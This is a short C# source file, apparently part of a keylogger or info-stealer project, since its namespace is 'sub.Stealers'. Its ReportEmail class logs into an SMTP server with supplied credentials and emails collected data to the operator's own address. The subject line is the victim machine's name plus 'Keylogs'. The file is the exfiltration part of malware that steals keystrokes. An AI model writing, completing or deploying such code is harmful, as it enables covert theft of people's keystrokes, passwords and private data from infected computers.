﻿using System;
using System.Collections.Generic;
using System.Net;
using System.Text;
using System.Net.Mail;

namespace sub.Stealers
{
    internal class ReportEmail
    {
        private string _username;
        private string _password;
        private string _host;
        private int _port;

        public ReportEmail(string username, string password, string host, int port)
        {
            _username = username;
            _password = password;
            _host = host;
            _port = port;
        }

        public void Send(string data)
        {
            //var fromAddress = new MailAddress(_username, name);
            //var toAddress = new MailAddress(_username, name);

            var smtp = new SmtpClient
            {
                Host = _host,
                Port = _port,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(_username, _password)
            };
            using (var message = new MailMessage(_username, _username)
            {
                Subject = Environment.MachineName + " " + "Keylogs",
                Body = data
            })
            {
                smtp.Send(message);
            }
        }
    }
}